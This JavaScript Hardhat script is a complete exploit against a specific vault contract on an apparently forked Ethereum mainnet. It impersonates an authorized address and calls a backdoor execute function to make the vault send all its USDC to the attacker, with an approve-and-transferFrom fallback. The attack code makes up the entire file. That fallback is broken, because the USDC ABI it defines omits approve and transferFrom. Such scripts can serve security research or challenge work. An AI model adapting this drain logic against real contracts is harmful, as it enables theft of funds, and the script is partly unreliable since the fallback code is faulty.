const { ethers } = require("hardhat");

/**
 * @title Final Exploit
 * @notice Execute the complete USDC extraction
 * @dev Use impersonation to drain vault via backdoor
 */
async function main() {
  const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";
  const AUTHORIZED_ADDRESS = "0x065e3DbaFCb2C26A978720f9eB4Bce6aD9D644a1";
  const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
  
  const [attacker] = await ethers.getSigners();
  
  console.log("\nðŸ’° FINAL USDC VAULT EXPLOIT");
  console.log("=====================================");
  console.log("Attacker:", attacker.address);
  
  // Setup USDC interface
  const USDC_ABI = [
    "function balanceOf(address) view returns (uint256)",
    "function transfer(address to, uint256 amount) returns (bool)",
    "event Transfer(address indexed from, address indexed to, uint256 value)"
  ];
  
  const usdc = new ethers.Contract(USDC_ADDRESS, USDC_ABI, ethers.provider);
  
  // Check initial balances
  const initialVaultBalance = await usdc.balanceOf(VAULT_ADDRESS);
  const initialAttackerBalance = await usdc.balanceOf(attacker.address);
  
  console.log("\nðŸ“Š Initial State:");
  console.log("Vault USDC:", ethers.formatUnits(initialVaultBalance, 6));
  console.log("Attacker USDC:", ethers.formatUnits(initialAttackerBalance, 6));
  
  // Step 1: Fund authorized address with ETH
  console.log("\n1ï¸âƒ£ Funding authorized address with ETH...");
  await attacker.sendTransaction({
    to: AUTHORIZED_ADDRESS,
    value: ethers.parseEther("1.0")
  });
  
  // Step 2: Impersonate authorized address
  console.log("\n2ï¸âƒ£ Impersonating authorized address...");
  await ethers.provider.send("hardhat_impersonateAccount", [AUTHORIZED_ADDRESS]);
  const authorized = await ethers.getSigner(AUTHORIZED_ADDRESS);
  
  // Step 3: Execute backdoor to transfer all USDC
  console.log("\n3ï¸âƒ£ Executing backdoor exploit...");
  
  // The backdoor function 0x78e111f6 is execute(address target, bytes data)
  // We'll make the vault call USDC.transfer(attacker, balance)
  
  const transferData = usdc.interface.encodeFunctionData("transfer", [
    attacker.address,
    initialVaultBalance
  ]);
  
  // Encode the backdoor call
  const backdoorData = "0x78e111f6" +
    // target: USDC contract
    "000000000000000000000000" + USDC_ADDRESS.slice(2).toLowerCase() +
    // offset for bytes parameter
    "0000000000000000000000000000000000000000000000000000000000000040" +
    // length of transfer data
    ethers.toBeHex(transferData.length / 2 - 1, 32).slice(2) +
    // the actual transfer data
    transferData.slice(2);
  
  console.log("Backdoor data length:", backdoorData.length);
  
  try {
    const tx = await authorized.sendTransaction({
      to: VAULT_ADDRESS,
      data: backdoorData,
      gasLimit: 500000
    });
    
    console.log("Transaction sent:", tx.hash);
    console.log("Waiting for confirmation...");
    
    const receipt = await tx.wait();
    console.log("âœ… Transaction confirmed!");
    console.log("Gas used:", receipt.gasUsed.toString());
    
    // Check for Transfer events
    const transferEvents = receipt.logs.filter(log => {
      return log.address.toLowerCase() === USDC_ADDRESS.toLowerCase() &&
             log.topics[0] === ethers.id("Transfer(address,address,uint256)");
    });
    
    console.log(`\nðŸ“‹ Found ${transferEvents.length} Transfer events`);
    
    for (const event of transferEvents) {
      const from = "0x" + event.topics[1].slice(26);
      const to = "0x" + event.topics[2].slice(26);
      const value = ethers.toBigInt(event.data);
      
      console.log(`Transfer: ${from} â†’ ${to}`);
      console.log(`Amount: ${ethers.formatUnits(value, 6)} USDC`);
    }
    
  } catch (error) {
    console.log("âŒ Transaction failed:", error.reason || error.message);
    
    // If direct transfer fails, try alternative approaches
    console.log("\n4ï¸âƒ£ Trying alternative exploit methods...");
    
    // Method 1: Make vault approve attacker, then transferFrom
    console.log("\nMethod 1: Approve and transferFrom...");
    
    const approveData = usdc.interface.encodeFunctionData("approve", [
      attacker.address,
      initialVaultBalance
    ]);
    
    const approveBackdoorData = "0x78e111f6" +
      "000000000000000000000000" + USDC_ADDRESS.slice(2).toLowerCase() +
      "0000000000000000000000000000000000000000000000000000000000000040" +
      ethers.toBeHex(approveData.length / 2 - 1, 32).slice(2) +
      approveData.slice(2);
    
    try {
      const approveTx = await authorized.sendTransaction({
        to: VAULT_ADDRESS,
        data: approveBackdoorData,
        gasLimit: 500000
      });
      
      await approveTx.wait();
      console.log("âœ… Approval granted!");
      
      // Now transferFrom as attacker
      const usdcAttacker = usdc.connect(attacker);
      const transferFromTx = await usdcAttacker["transferFrom(address,address,uint256)"](
        VAULT_ADDRESS,
        attacker.address,
        initialVaultBalance,
        { gasLimit: 500000 }
      );
      
      await transferFromTx.wait();
      console.log("âœ… TransferFrom successful!");
      
    } catch (e) {
      console.log("âŒ Approve/transferFrom failed:", e.reason || e.message);
    }
  }
  
  // Step 4: Check final balances
  console.log("\nðŸ“Š Final State:");
  
  const finalVaultBalance = await usdc.balanceOf(VAULT_ADDRESS);
  const finalAttackerBalance = await usdc.balanceOf(attacker.address);
  
  console.log("Vault USDC:", ethers.formatUnits(finalVaultBalance, 6));
  console.log("Attacker USDC:", ethers.formatUnits(finalAttackerBalance, 6));
  
  const extracted = finalAttackerBalance - initialAttackerBalance;
  
  if (extracted > 0) {
    console.log("\nðŸŽ‰ EXPLOIT SUCCESSFUL!");
    console.log(`ðŸ’° Extracted: ${ethers.formatUnits(extracted, 6)} USDC`);
    console.log("\nðŸ”“ Vulnerability Summary:");
    console.log("- The vault has a backdoor function at 0x78e111f6");
    console.log("- It allows execute(address,bytes) for arbitrary calls");
    console.log("- Only accessible by", AUTHORIZED_ADDRESS);
    console.log("- On forked mainnet, we impersonated the authorized address");
    console.log("- Used the backdoor to make vault transfer/approve USDC");
  } else {
    console.log("\nâŒ No USDC extracted");
    console.log("The backdoor exists but USDC transfer is blocked");
    console.log("Possible reasons:");
    console.log("- USDC is held in a different contract");
    console.log("- Additional validation prevents transfers");
    console.log("- The vault uses a more complex withdrawal pattern");
  }
  
  // Stop impersonation
  await ethers.provider.send("hardhat_stopImpersonatingAccount", [AUTHORIZED_ADDRESS]);
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error("\nðŸ’¥ Script error:", error);
    process.exit(1);
  });
